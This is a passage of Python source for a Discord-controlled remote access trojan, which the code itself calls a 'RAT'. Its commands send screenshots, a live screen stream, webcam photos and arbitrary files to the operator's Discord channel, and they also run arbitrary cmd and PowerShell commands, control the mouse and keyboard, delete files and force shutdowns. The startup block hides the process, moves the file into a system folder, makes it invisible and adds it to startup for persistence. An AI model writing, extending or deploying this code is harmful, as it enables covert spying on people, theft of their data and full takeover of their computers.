        with open(filename, 'rb') as f:
            picture = discord.File(f)
        await send_embed(ctx, "📸 Screenshot", f"Captured: **{filename}**", discord.Color.green())
        await ctx.send(file=picture)
        os.remove(filename)
    except Exception as e:
        await send_embed(ctx, "Screenshot Error", str(e), discord.Color.red())

@bot.command(name='screenshare')
@is_authorized()
async def cmd_screenshare(ctx):
    global STREAMING, STREAM_TASK
    if STREAMING:
        await send_embed(ctx, "Already Streaming", "Already active!", discord.Color.orange())
        return
    STREAMING = True
    await send_embed(ctx, "📺 Screen Share Started", "Sending screenshots every 2 seconds.", discord.Color.green())
    async def stream_screen():
        while STREAMING:
            try:
                screenshot = pyautogui.screenshot()
                filename = f"stream_{int(time.time())}.png"
                screenshot.save(filename)
                await ctx.send(file=discord.File(filename))
                os.remove(filename)
                await asyncio.sleep(2)
            except:
                break
    STREAM_TASK = asyncio.create_task(stream_screen())

@bot.command(name='stopscreenshare')
@is_authorized()
async def cmd_stopscreenshare(ctx):
    global STREAMING, STREAM_TASK
    if not STREAMING:
        await send_embed(ctx, "Not Streaming", "No active stream.", discord.Color.orange())
        return
    STREAMING = False
    if STREAM_TASK:
        STREAM_TASK.cancel()
    await send_embed(ctx, "⏹️ Screen Share Stopped", "Stopped.", discord.Color.red())

@bot.command(name='webcam')
@is_authorized()
async def cmd_webcam(ctx):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            await ctx.send(file=discord.File("webcam.jpg"))
            os.remove("webcam.jpg")
            await send_embed(ctx, "📸 Webcam Photo", "Photo captured!", discord.Color.green())
        else:
            await send_embed(ctx, "Webcam Error", "Could not access webcam", discord.Color.red())
        cap.release()
    except Exception as e:
        await send_embed(ctx, "Webcam Error", str(e), discord.Color.red())

@bot.command(name='open')
@is_authorized()
async def cmd_open(ctx, *, app_name: str):
    try:
        app_map = {
            'notepad': 'notepad.exe',
            'calculator': 'calc.exe',
            'chrome': 'chrome.exe',
            'firefox': 'firefox.exe',
            'explorer': 'explorer.exe',
            'cmd': 'cmd.exe',
            'discord': 'discord.exe',
            'spotify': 'spotify.exe',
            'steam': 'steam.exe',
        }
        app_to_open = app_map.get(app_name.lower(), app_name)
        subprocess.Popen(app_to_open, shell=True)
        await send_embed(ctx, "✅ Opened", f"**{app_name}**", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Open Error", str(e), discord.Color.red())

@bot.command(name='close')
@is_authorized()
async def cmd_close(ctx, *, app_name: str):
    try:
        closed = False
        for proc in psutil.process_iter(['pid', 'name']):
            if app_name.lower() in proc.info['name'].lower():
                proc.terminate()
                closed = True
        if closed:
            await send_embed(ctx, "✅ Closed", f"**{app_name}**", discord.Color.green())
        else:
            await send_embed(ctx, "Close Failed", f"No process found: **{app_name}**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Close Error", str(e), discord.Color.red())

@bot.command(name='listapps')
@is_authorized()
async def cmd_listapps(ctx, limit: int = 15):
    try:
        windows = gw.getAllTitles()
        active_windows = [win for win in windows if win]
        embed = discord.Embed(
            title="📋 Running Applications",
            description=f"Showing **{min(limit, len(active_windows))}** of **{len(active_windows)}** total windows",
            color=discord.Color.green()
        )
        for i, window in enumerate(active_windows[:limit]):
            embed.add_field(name=f"#{i+1} - {window[:50]}", value="\u200b", inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "List Apps Error", str(e), discord.Color.red())

@bot.command(name='cmd')
@is_authorized()
async def cmd_cmd(ctx, *, command: str):
    try:
        await send_embed(ctx, "Command Executing", f"Running: **{command}**", discord.Color.dark_grey())
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        if len(output) > 1900:
            output = output[:1900] + "..."
        embed = discord.Embed(
            title="💻 Command Output",
            description=f"```\n{output}\n```",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)
    except subprocess.TimeoutExpired:
        await send_embed(ctx, "Command Error", "Timed out!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Command Error", str(e), discord.Color.red())

@bot.command(name='powershell')
@is_authorized()
async def cmd_powershell(ctx, *, command: str):
    try:
        await send_embed(ctx, "PowerShell Executing", f"Running: **{command}**", discord.Color.dark_grey())
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        if len(output) > 1900:
            output = output[:1900] + "..."
        embed = discord.Embed(
            title="⚡ PowerShell Output",
            description=f"```\n{output}\n```",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)
    except subprocess.TimeoutExpired:
        await send_embed(ctx, "PowerShell Error", "Timed out!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "PowerShell Error", str(e), discord.Color.red())

# ========== MOUSE & KEYBOARD COMMANDS ==========

@bot.command(name='click')
@is_authorized()
async def cmd_click(ctx, button: str = 'left'):
    try:
        button = button.lower()
        if button == 'left':
            pyautogui.click()
            await send_embed(ctx, "Mouse Click", "**left** click", discord.Color.blue())
        elif button == 'right':
            pyautogui.rightClick()
            await send_embed(ctx, "Mouse Click", "**right** click", discord.Color.blue())
        elif button == 'middle':
            pyautogui.middleClick()
            await send_embed(ctx, "Mouse Click", "**middle** click", discord.Color.blue())
        else:
            await send_embed(ctx, "Invalid Button", "Use: **left**, **right**, or **middle**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Click Error", str(e), discord.Color.red())

@bot.command(name='press')
@is_authorized()
async def cmd_press(ctx, *, key_combo: str):
    try:
        pyautogui.hotkey(*key_combo.split('+'))
        await send_embed(ctx, "Keys Pressed", f"Pressed: **{key_combo}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Press Error", str(e), discord.Color.red())

@bot.command(name='type')
@is_authorized()
async def cmd_type(ctx, *, text: str):
    try:
        pyautogui.typewrite(text)
        await send_embed(ctx, "Typing", f"Typed: **{text[:50]}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Type Error", str(e), discord.Color.red())

@bot.command(name='move')
@is_authorized()
async def cmd_move(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await send_embed(ctx, "Mouse Moved", f"Moved to ({x}, {y})", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Move Error", str(e), discord.Color.red())

@bot.command(name='scroll')
@is_authorized()
async def cmd_scroll(ctx, amount: int):
    try:
        pyautogui.scroll(amount)
        await send_embed(ctx, "Scrolled", f"Scrolled **{amount}**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Scroll Error", str(e), discord.Color.red())

@bot.command(name='doubleclick')
@is_authorized()
async def cmd_doubleclick(ctx):
    try:
        pyautogui.doubleClick()
        await send_embed(ctx, "Double Click", "Double clicked", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Click Error", str(e), discord.Color.red())

@bot.command(name='rightclick')
@is_authorized()
async def cmd_rightclick(ctx):
    try:
        pyautogui.rightClick()
        await send_embed(ctx, "Right Click", "Right clicked", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Click Error", str(e), discord.Color.red())

@bot.command(name='getpos')
@is_authorized()
async def cmd_getpos(ctx):
    try:
        pos = pyautogui.position()
        await send_embed(ctx, "Mouse Position", f"**({pos.x}, {pos.y})**", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Position Error", str(e), discord.Color.red())

# ========== POWER CONTROL COMMANDS ==========

@bot.command(name='shutdown')
@is_authorized()
async def cmd_shutdown(ctx, delay: int = 60):
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least 10 seconds", discord.Color.orange())
            return
        await send_embed(ctx, "💻 Shutdown", f"Shutting down in {delay}s", discord.Color.red())
        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Shutting down in 5 seconds...", discord.Color.dark_red())
        await asyncio.sleep(5)
        os.system('shutdown /s /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Shutdown Error", str(e), discord.Color.red())

@bot.command(name='restart')
@is_authorized()
async def cmd_restart(ctx, delay: int = 60):
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least 10 seconds", discord.Color.orange())
            return
        await send_embed(ctx, "🔄 Restart", f"Restarting in {delay}s", discord.Color.orange())
        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Restarting in 5 seconds...", discord.Color.dark_orange())
        await asyncio.sleep(5)
        os.system('shutdown /r /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Restart Error", str(e), discord.Color.red())

@bot.command(name='sleep')
@is_authorized()
async def cmd_sleep(ctx):
    try:
        ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
        await send_embed(ctx, "💤 Sleep", "Going to sleep!", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Sleep Error", str(e), discord.Color.red())

@bot.command(name='logoff')
@is_authorized()
async def cmd_logoff(ctx):
    try:
        os.system('shutdown /l')
        await send_embed(ctx, "👋 Logoff", "Logging off!", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Logoff Error", str(e), discord.Color.red())

# ========== MEDIA COMMANDS ==========

@bot.command(name='playpause')
@is_authorized()
async def cmd_playpause(ctx):
    try:
        pyautogui.press('playpause')
        await send_embed(ctx, "⏯️ Media", "Toggled play/pause", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", str(e), discord.Color.red())

@bot.command(name='nexttrack')
@is_authorized()
async def cmd_nexttrack(ctx):
    try:
        pyautogui.press('nexttrack')
        await send_embed(ctx, "⏭️ Media", "Next track", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", str(e), discord.Color.red())

@bot.command(name='prevtrack')
@is_authorized()
async def cmd_prevtrack(ctx):
    try:
        pyautogui.press('prevtrack')
        await send_embed(ctx, "⏮️ Media", "Previous track", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", str(e), discord.Color.red())

@bot.command(name='volumeup')
@is_authorized()
async def cmd_volumeup(ctx):
    try:
        pyautogui.press('volumeup')
        await send_embed(ctx, "🔊 Media", "Volume up", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", str(e), discord.Color.red())

@bot.command(name='volumedown')
@is_authorized()
async def cmd_volumedown(ctx):
    try:
        pyautogui.press('volumedown')
        await send_embed(ctx, "🔉 Media", "Volume down", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", str(e), discord.Color.red())

@bot.command(name='mute')
@is_authorized()
async def cmd_mute(ctx):
    try:
        pyautogui.press('volumemute')
        await send_embed(ctx, "🔇 Media", "Volume muted", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", str(e), discord.Color.red())

# ========== FILES COMMANDS ==========

@bot.command(name='listfiles')
@is_authorized()
async def cmd_listfiles(ctx, directory: str = "."):
    try:
        files = os.listdir(directory)
        embed = discord.Embed(title=f"📁 Files in {directory}", color=discord.Color.blue())
        file_list = []
        for file in files[:20]:  
            file_path = os.path.join(directory, file)
            if os.path.isdir(file_path):
                file_list.append(f"**{file}/**")
            else:
                file_list.append(f"**{file}**")
        embed.description = "\n".join(file_list)
        if len(files) > 20:
            embed.set_footer(text=f"And {len(files) - 20} more files...")
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "List Files Error", str(e), discord.Color.red())

@bot.command(name='download')
@is_authorized()
async def cmd_download(ctx, *, filepath: str):
    try:
        if not os.path.exists(filepath):
            await send_embed(ctx, "Download Error", "File not found!", discord.Color.red())
            return
        await ctx.send(file=discord.File(filepath))
        await send_embed(ctx, "Download Complete", f"Sent: **{filepath}**", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Download Error", str(e), discord.Color.red())

@bot.command(name='deletefile')
@is_authorized()
async def cmd_deletefile(ctx, *, filepath: str):
    try:
        if os.path.exists(filepath):
            os.remove(filepath)
            await send_embed(ctx, "File Deleted", f"Deleted: **{filepath}**", discord.Color.red())
        else:
            await send_embed(ctx, "File Not Found", f"Not found: **{filepath}**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Delete Error", str(e), discord.Color.red())

@bot.command(name='createfile')
@is_authorized()
async def cmd_createfile(ctx, filename: str, *, content: str = ""):
    try:
        with open(filename, 'w') as f:
            f.write(content)
        await send_embed(ctx, "File Created", f"Created: **{filename}**", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Create Error", str(e), discord.Color.red())

# ========== FUN/ANNOYING COMMANDS ==========

@bot.command(name='jumpscare')
@is_authorized()
async def cmd_jumpscare(ctx):
    try:
        await send_embed(ctx, "👻 Jumpscare!", "Triggering jumpscare...", discord.Color.purple())
        jumpscare()
        await send_embed(ctx, "👻 Jumpscare Complete", "BOO!", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Jumpscare Error", str(e), discord.Color.red())

@bot.command(name='fakebsod')
@is_authorized()
async def cmd_fakebsod(ctx):
    try:
        await send_embed(ctx, "💀 Fake BSOD", "Displaying fake BSOD...", discord.Color.dark_red())
        fake_bsod()
        await send_embed(ctx, "💀 Fake BSOD Complete", "Displayed!", discord.Color.dark_red())
    except Exception as e:
        await send_embed(ctx, "Fake BSOD Error", str(e), discord.Color.red())

@bot.command(name='mousemove')
@is_authorized()
async def cmd_mousemove(ctx):
    try:
        await send_embed(ctx, "🖱️ Mouse Move", "Moving mouse...", discord.Color.blue())
        for _ in range(5):
            x = random.randint(0, 1920)
            y = random.randint(0, 1080)
            pyautogui.moveTo(x, y, duration=0.5)
        await send_embed(ctx, "🖱️ Mouse Move Complete", "Mouse moved!", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Mouse Move Error", str(e), discord.Color.red())

@bot.command(name='reversescreen')
@is_authorized()
async def cmd_reversescreen(ctx):
    try:
        await send_embed(ctx, "🔄 Reverse Screen", "Flipping screen...", discord.Color.blue())
        try:
            import win32api
            import win32con
            win32api.ChangeDisplaySettingsEx(None, {'dmDisplayOrientation': 2}, win32con.CDS_UPDATEREGISTRY)
            await send_embed(ctx, "🔄 Reverse Screen Complete", "Screen flipped!", discord.Color.blue())
        except:
            await send_embed(ctx, "🔄 Reverse Screen", "Failed. May require admin.", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Reverse Screen Error", str(e), discord.Color.red())

@bot.command(name='opensite')
@is_authorized()
async def cmd_opensite(ctx):
    try:
        sites = [
            'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
            'https://www.youtube.com/watch?v=9bZkp7q19f0',
            'https://www.youtube.com/watch?v=KYniUCGPGLs',
        ]
        webbrowser.open(random.choice(sites))
        await send_embed(ctx, "🌐 Site Opened", "Random website opened!", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Open Site Error", str(e), discord.Color.red())

# ========== BOT COMMANDS ==========

@bot.command(name='clearchat')
@is_authorized()
async def cmd_clearchat(ctx, amount: int = 100):
    try:
        deleted = 0
        async for message in ctx.channel.history(limit=amount):
            if message.author == bot.user:
                await message.delete()
                deleted += 1
                await asyncio.sleep(0.1)
        if deleted > 0:
            msg = await ctx.send(f"✅ Deleted **{deleted}** bot messages!")
            await asyncio.sleep(2)
            await msg.delete()
        else:
            await ctx.send("No bot messages found.", delete_after=3)
    except Exception as e:
        await send_embed(ctx, "Clear Error", str(e), discord.Color.red())

@bot.command(name='exit')
@is_authorized()
async def cmd_exit(ctx):
    try:
        await send_embed(ctx, "👋 Goodbye!", "RAT is closing...", discord.Color.dark_grey())
        time.sleep(1)
        sys.exit(0)
    except Exception as e:
        await send_embed(ctx, "Command Error", str(e), discord.Color.red())

# ========== RUN ==========
if __name__ == "__main__":
    try:
        hide_process_completely()
        move_to_system_folder()
        make_file_invisible()
    except:
        pass
    if platform.system() == "Windows" and Config.STARTUP:
        add_to_startup()
    bot.run(Config.TOKEN)
